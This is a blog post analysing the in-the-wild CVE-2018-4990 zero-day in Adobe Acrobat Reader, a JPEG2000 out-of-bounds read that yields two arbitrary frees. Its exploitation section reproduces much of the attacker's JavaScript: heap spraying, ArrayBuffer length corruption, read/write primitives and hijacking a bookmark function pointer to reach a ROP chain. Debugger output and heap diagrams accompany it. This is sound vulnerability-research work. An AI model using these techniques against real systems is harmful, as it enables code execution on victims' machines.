---
layout: post
title: "Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit"
date: 2018-05-21 09:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Acrobat Reader" src="/assets/images/reader.png">
<p class="cn" markdown="1">
**Update!** I originally titled this blog post 'Adobe, Me and a Double Free', however as a good friend of mine [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017) of Tencent's Xuanwu LAB pointed out, this vulnerability is actually an out-of-bounds read that leads to two arbitrary free conditions. Therefore I have updated my analysis of the root cause as well as the exploitation.
</p>

<p class="cn" markdown="1">
I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a marketing blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which was a ~~decent~~, pretty poor analysis and it was missing some important things for me, such as how was the bug actually exploited?</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn">I walk through how the attacker(s) exploited CVE-2018-4990 which is an out of bounds read in Acrobat Reader when processing specially crafted JPEG2000 images.</p>

### Introduction

<p class="cn" markdown="1">It's uncommon to see Acrobat Reader exploits in the wild these days so I decided to take a look at this one. All testing was done AcroRd32.exe (c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc) v2018.011.20035. Other versions are also affected, please see Adobe's bulletin [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html) for more details.</p>

### Getting to the root of the vulnerability

<p class="cn" markdown="1">

The first thing I needed to do was uncompress the PDF as many objects are compressed, hiding the true functionaility such as JavaScript and images. I like to use [pdf toolkit](https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/) since it's command line driven.</p>

`c:\> pdftk 4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01 output poc.pdf uncompress`

<p class="cn" markdown="1">
Since I don't have an original sample of the JPEG2000 image, I have no idea if this image was bitflipped or not, so I am only going to dive into the JavaScript.

After stripping away the rest of the JavaScript, we can see the following code will trigger the out of bounds read:</p>

```JavaScript
function trigger(){
    var f = this.getField("Button1");
    if(f){
        f.display = display.visible;
    }
}
trigger();
```
<p class="cn" markdown="1">


The JavaScript comes from an OpenAction triggered from the root node</p>

```
1 0 obj 
<<
/Length 130
>>
stream
function trigger(){
    var f = this.getField("Button1");
    if(f){
        f.display = display.visible;
    }
}
trigger();
endstream 
endobj

...

5 0 obj 
<<
/Outlines 2 0 R
/Pages 3 0 R
/OpenAction 6 0 R
/AcroForm 7 0 R
/Type /Catalog
>>
endobj 
6 0 obj 
<<
/JS 1 0 R
/Type /Action
/S /JavaScript
>>
endobj 

...

trailer

<<
/Root 5 0 R
/Size 39
>>
```

<p class="cn" markdown="1">With page heap and user-mode stack traces enabled, we get the following crash.</p>

```
(a48.1538): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=020e0000 edi=020e0000
eip=66886e88 esp=0022a028 ebp=0022a074 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8:
66886e88 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:0023:d0d0d0b0=????????
0:000> kv
ChildEBP RetAddr  Args to Child              
0022a074 66886f95 020e1000 d0d0d0d0 020e0000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 (FPO: [SEH])
0022a098 66887240 020e1000 d0d0d0d0 0022a108 verifier!AVrfpDphFindBusyMemory+0x15 (FPO: [2,5,0])
0022a0b4 66889080 020e1000 d0d0d0d0 0078d911 verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 (FPO: [2,3,0])
0022a0d0 777969cc 020e0000 01000002 d0d0d0d0 verifier!AVrfDebugPageHeapFree+0x90 (FPO: [3,3,0])
0022a118 77759e07 020e0000 01000002 d0d0d0d0 ntdll!RtlDebugFreeHeap+0x2f (FPO: [SEH])
0022a20c 777263a6 00000000 d0d0d0d0 387e2f98 ntdll!RtlpFreeHeap+0x5d (FPO: [SEH])
0022a22c 7595c614 020e0000 00000000 d0d0d0d0 ntdll!RtlFreeHeap+0x142 (FPO: [3,1,4])
0022a240 5df7ecfa 020e0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14 (FPO: [3,0,0])
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\JP2KLib.dll - 
0022a254 667d0574 d0d0d0d0 7ea9257c 69616fac MSVCR120!free+0x1a (FPO: [Non-Fpo]) (CONV: cdecl) [f:\dd\vctools\crt\crtw32\heap\free.c @ 51]
WARNING: Stack unwind information not available. Following frames may be wrong.
0022a374 667e6482 35588fb8 4380cfd8 000000fd JP2KLib!JP2KCopyRect+0xbae6
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.dll - 
0022a3cc 511d6cfc 36496e88 68d96fd0 4380cfd8 JP2KLib!JP2KImageInitDecoderEx+0x24
0022a454 511d8696 3570afa8 69616fac 3570afa8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261843
0022a4b4 511cd785 69616fac 0022a4d4 511d6640 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2631dd
0022a4c0 511d6640 69616fac 462f6f70 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2582cc
0022a4d4 50dc030d 69616fac 41826fd0 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261187
0022a510 50dbf92b c0010000 0000000d 41826fc8 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x7867d
0022a5e0 50dbebc6 0022a988 00000000 60b2d137 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x77c9b
0022a930 50dbeb88 0022a988 45c3aa50 60b2d163 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76f36
0022a964 50dbea71 41826e28 45c3aa50 0022aa1c AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76ef8
0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1
```

<p class="cn" markdown="1">We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6, let's dive into that function to see what is happening.</p>

{% include image.html
            img="assets/images/reader-df.png#1"
            title="The location of the out of bounds read in sub_1004F3BD"
            caption="The location of the out of bounds read in sub_1004F3BD"
            style="width:50%;height:50%" %}

<p class="cn" markdown="1">We can see that we are actually within a looped operation. The code is looping over an index which is used to read values out of a buffer. The buffer that its trying to read from is size 0x3f4. So if the index is 0xfd we have a read from buffer+(0xfd*0x4) == 0x3f4 which is the first dword out of bounds. Now if the loop continues for one last time (0xfe < 0xff) then we have a second out of bounds read of another dword. Therefore this bug reads 8 bytes out of bounds.</p>

<p class="cn" markdown="1">If the value that it reads is not null, then the code pushs the out of bounds value as the first argument to sub_10066FEA and calls it.</p>

<p class="cn" markdown="1">Were going to set a break point just before the caller on the `push eax` to check what is happening.</p>

```
Breakpoint 1 hit
eax=d0d0d0d0 ebx=00000000 ecx=000000fd edx=00000001 esi=33b6cf98 edi=68032e88
eip=667e056e esp=0028a724 ebp=0028a838 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
JP2KLib!JP2KCopyRect+0xbae0:
667e056e 50              push    eax
0:000> bl
 0 e 667e056e     0001 (0001)  0:**** JP2KLib!JP2KCopyRect+0xbae0
0:000> dd poi(esi+0x48)+0x4 L1
4732cfe4  000000ff
0:000> r ecx
ecx=000000fd
```

<p class="cn" markdown="1">We can clearly see that the upper bound is 0xff and the current index is 0xfd. I am unsure if this upper bound value is controllable, the `display.visible` constant is actually 0.</p>

<p class="cn" markdown="1">Depending on what sub_10066FEA does with the out of bounds value (eax), will actually determine the exploitability of this bug. But we already know already that it eventually tries to free the first argument. So essentially, this is an out of bounds read that leads to two arbitrary free's.</p>

<p class="cn" markdown="1">
An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration.</p>

#### Exploitation

<p class="cn" markdown="1">
So in order to reach the arbitrary free's though, the attacker needs to perform the following:
</p>

<div markdown="1" class="cn">
1. Load PDF, parse (presumably) a malformed JP2K image inside of a field button.
2. Allocate a large amount of ArrayBuffer's that are just larger than the buffer that is read out of bounds
3. Set the precise index (which is 249 and 250) with pointers to what the attackers want to free
4. Free every second ArrayBuffer so that the allocation will land in a slot
5. Trigger the bug which actually allocates into a slot and read out of bounds, freeing the two pointers
</div>

<p class="cn" markdown="1">This is what the JavaScript code looks like to so this:</p>

```JavaScript
var a         = new Array(0x3000);
var spraynum  = 0x1000;
var sprayarr  = new Array(spraynum);
var spraylen  = 0x10000-24;
var spraybase = 0x0d0e0048;
var spraypos  = 0x0d0f0058;

// force allocations to prepare the heap for the oob read
for(var i1 = 1; i1 < 0x3000; i1++){
    a[i] = new Uint32Array(252);
    a1[i1][249] = spraybase;
    a1[i1][250] = spraybase + 0x10000;
}

// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048
for(var i1 = 1; i1 < spraynum; i++){
    sprayarr[i1] = new ArrayBuffer(spraylen);
}

// make holes so the oob read chunk lands here
for(var i1 = 1; i1 < 0x3000; i1 = i1 + 2){
    delete a[i1];
    a[i1] = null;
}
```

<p class="cn" markdown="1">Essentially what this code is doing to get the frees:</p>

```JavaScript
1. Alloc TypedArray         2. Free TypedArray           3. Alloc from JP2KLib        4. OOB Read + free!
+--------------------+      +---------------------+      +---------------------+      +---------------------+
|                    |      |                     |      | +-----------------+ |      | +-----------------+ |
|                    |      |                     |      | |                 | |      | |                 | +-----+
|                    |      |                     |      | |                 | |      | |                 | +---+ |
|                    | +--> |                     | +--> | |Size: 0x3f4      | | +--> | |Size: 0x3f4      | |   | |
|                    |      |                     |      | +-----------------+ |      | +-----------------+ |   | |
| +249: 0x0d0e0048   |      | +249: 0x0d0e0048    |      | +249: 0x0d0e0048    |      | +249: 0x0d0e0048    | <-+ |
| +250: 0x0d0e0048   |      | +250: 0x0d0e0048    |      | +250: 0x0d0e0048    |      | +250: 0x0d0e0048    | <---+
+--------------------+      +---------------------+      +---------------------+      +---------------------+
Size: 0x400                 Size: 0x400                  Size: 0x400                  Size: 0x400
```

<p class="cn" markdown="1">Size 252 is used because 252 * 4 is 0x3F0. Then if we add the header (0x10) the total is 0x400. This is just enough to allocate 8 bytes over the top of the target buffer to exploit the out of bounds read.</p>

<p class="cn" markdown="1">So the attackers free two buffers of size 0x10000 which gives them a nice use-after-free condition in JavaScript since they already have references to `sprayarr`. Since the buffers are sequential, coalescing occurs and the freed buffer becomes size 0x20000.</p>

<p class="cn" markdown="1">So after the two free's occur, we are left with the heap in this state.</p>

```
1. Spray Heap                   2. Trigger arbitrary free       3. Trigger arbitrary free       4. Coalesce the 2 chunks
+------------------------+      +------------------------+      +------------------------+      +------------------------+
|                        |      |                        |      |                        |      |                        |
|    Size: 0x10000       |      |    Size: 0x10000       |      |    Size: 0x10000       |      |    Size: 0x10000       |
|                        |      |                        |      |                        |      |                        |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |      |    +--------------+    |
|    |              |    |      |    |              |    |      |    |              |    |      |    |              |    |
|    |  Allocated   |    |      |    |  Allocated   |    |      |    |  Allocated   |    |      |    |  Allocated   |    |
|    |              |    |      |    |              |    |      |    |              |    |      |    |              |    |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |      |    +--------------+    |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |      |    +--------------+    |
|    |              |    |      |    |              |    |      |    |              |    |      |    |              |    |
|    |  Allocated   |    | +--> |    |  Freed       |    | +--> |    |  Freed       |    |+--   |    |  Freed       |    |
|    |              |    |      |    |              |    |      |    |              |    |  |   |    |  chunks      |    |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |  --> |    |  coalesced   |    |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |  --> |    |  size:       |    |
|    |              |    |      |    |              |    |      |    |              |    |  |   |    |  0x20000     |    |
|    |  Allocated   |    |      |    |  Allocated   |    | +--> |    |  Freed       |    |+--   |    |              |    |
|    |              |    |      |    |              |    |      |    |              |    |      |    |              |    |
|    +--------------+    |      |    +--------------+    |      |    +--------------+    |      |    +--------------+    |
|                        |      |                        |      |                        |      |                        |
+------------------------+      +------------------------+      +------------------------+      +------------------------+
```

<p class="cn" markdown="1">Now all the attackers need to do is allocate a TypedArray of size 0x20000 and using the `sprayarr` reference, find it to overwrite the next ArrayBuffer's byte length.</p>

```JavaScript
    // reclaims the memory, like your typical use after free
    for(var i1 = 1; i1 < 0x40; i1++){
        sprayarr2[i1] = new ArrayBuffer(0x20000-24);
    }

    // look for the TypedArray that is 0x20000 in size
    for(var i1 = 1; i1 < spraynum; i1++){
        if( sprayarr[i1].byteLength == 0x20000-24){
            
            // This is the magic, overwrite the next TypedArray's byte length
            var biga = new DataView(sprayarr[i1]);

            // offset to the byte length in the header
            biga.setUint32(0x10000 - 12, 0x66666666);

            // +1 because the next reference as a corrupted length now.
            if(sprayarr[i1 + 1].byteLength == 0x66666666){

                // game over attackers can read/write out of biga
                biga = new DataView(sprayarr[i1 + 1]);

                ...
```

<p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>

<p class="cn" markdown="1">At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of an Array that hold's TypedArray's.</p>

```
            var arr = new Array(0x10000);
            for(var i2 = 0x10; i2 < 0x10000; i2++)
                arr[i2] = new Uint32Array(1);
            for(var i2 = 1; i2 < 0x10; i2++){
                arr[i2] = new Uint32Array(sprayarr[i+i2]);

                // set the index into the first element of the TypedArray
                // so that the attackers where they are
                arr[i2][0] = i2;
            }
            
            for(var i2 = 0x30000; i2 < (0x10000 * 0x10); i2 = i2 + 4)
            {
                if( biga.getUint32(i2, true) == spraylen && biga.getUint32(i2 + 4, true) > spraypos ){
                    
                    // save a reference to the relative read/write TypedArray
                    mydv = biga;

                    // leak the index
                    var itmp = mydv.getUint32(i2 + 12, true);

                    // get a reference to TypedArray that they overwrite
                    myarray = arr1[itmp];

                    // get the index to the pointer of the TypedArray
                    mypos = biga.getUint32(i2 + 4, true) - spraypos + 0x50;

                    // set its byte length to a stupid number also
                    mydv.setUint32(mypos - 0x10, 0x100000, true);

                    // leak the base of the myarray Array
                    myarraybase = mydv.getUint32(mypos, true);
```

<p class="cn" markdown="1">For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the `myarray` Array (`mypos`) with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address.</p>

```
function myread(addr){
    mydv.setUint32(mypos, addr, true);
    var res = myarray[0];
    mydv.setUint32(mypos, myarraybase, true);
    return res;
}

function mywrite(addr, value){
    mydv.setUint32(mypos, addr, true);
    myarray[0] = value;
    mydv.setUint32(mypos, myarraybase, true);
}
```
<p class="cn" markdown="1">Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, stored it all in the `myarray` TypedArray overwrote the bookmark object's execute function pointer with the base address of `myarray` to finally redirect execution flow.</p>

```
var bkm = this.bookmarkRoot;        
var objescript = 0x23A59BA4 - 0x23800000 + dll_base;
objescript = myread(objescript);

...

mywrite(objescript, 0x6b707d06 - 0x6b640000 + dll_base); 
mywrite(objescript + 4, myarraybase);
mywrite(objescript + 0x598,0x6b68389f - 0x6b640000 + dll_base);

// adios!
bkm.execute();
```

### Conclusion

<p class="cn">Adobe Acrobat Reader is still a great target for attackers since JavaScript is so flexible with ArrayBuffers and PDF parsing is so complicated. OS mitigations have very little impact and it's up to Adobe to opt-in and harden it's binaries (/GUARD:CF) to make exploitation harder. Had Adobe enabled CFG and developed a form of isolated heap (like they did with flash) then this bug might have been much harder to exploit.</p>
<p class="cn">As already mentioned, this sample looks like it was still in active development, no obfuscation was done on the JavaScript, but this is very much a throw away bug as I'm sure many other bugs exist in JP2KLib.dll. Nevertheless this was a fantastic bug and an even better exploit!</p>

### References

<div markdown="1" class="cn">
- [https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)
- [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017)
- [asciiflow]http://asciiflow.com/
</div>